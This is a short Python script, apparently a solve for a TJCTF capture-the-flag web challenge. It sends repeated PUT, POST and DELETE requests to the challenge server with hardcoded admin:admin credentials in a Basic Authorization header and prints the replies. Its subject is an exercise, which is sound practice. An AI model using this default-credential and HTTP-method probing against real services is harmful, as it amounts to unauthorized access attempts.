#!/usr/bin/env python

import requests
import base64

url = 'https://request_me.tjctf.org/'
headers = {"Authorization" : "Basic " + base64.b64encode('admin:admin')}
data = {"username" : "admin", "password" : "admin"}

# while (1):
r = requests.put(url, headers = headers, data = data)
print r.text

r = requests.put(url, headers = headers, data = data)
print r.text

r = requests.post(url, headers = headers, data = data)
print r.text

r = requests.post(url, headers = headers, data = data)
print r.text

r = requests.delete(url, headers = headers, data = data)
print r.text
